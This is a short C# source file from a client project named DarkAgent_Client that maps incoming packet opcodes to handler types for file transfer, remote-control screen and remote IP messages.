using System;
using System.Collections.Generic;
using System.Text;
using DarkAgent_Client.src.Network.FileNetwork.Packets.Receive;

namespace DarkAgent_Client.src.Network.FileNetwork.Packets
{
    public class FileClientPacketProcessor
    {
        private static SortedList<short, PacketType> packetList;

        public static void Initialize()
        {
            packetList = new SortedList<short, PacketType>();
            RegisterPacket(new PacketType("FileTransfer Begin",     0x00, typeof(R_FileTransferBegin)));
            RegisterPacket(new PacketType("FileTransfer Data",      0x01, typeof(R_FileTransferSend)));
            RegisterPacket(new PacketType("FileTransfer Complete",  0x02, typeof(R_FileTransferEnd)));
            RegisterPacket(new PacketType("RemoteControl Screen",   0x03, typeof(R_RemoteControlScreen)));
            RegisterPacket(new PacketType("RemoteIP",               0x04, typeof(R_RemoteIP)));
        }

        private static void RegisterPacket(PacketType packet)
        {
            packetList.Add(packet.Opcode, packet);
        }

        public static Type ProcessPacket(byte[] packet)
        {
            if (packetList.ContainsKey((short)packet[0]))
                return packetList[(short)packet[0]].Packet;
            else
                return null;
        }

        private class PacketType
        {
            public string Name { get; private set; }
            public short Opcode { get; private set; }
            public Type Packet { get; private set; }

            public PacketType(string name, short opcode, Type packet)
            {
                Name = name;
                Opcode = opcode;
                Packet = packet;
            }
        }
    }
}
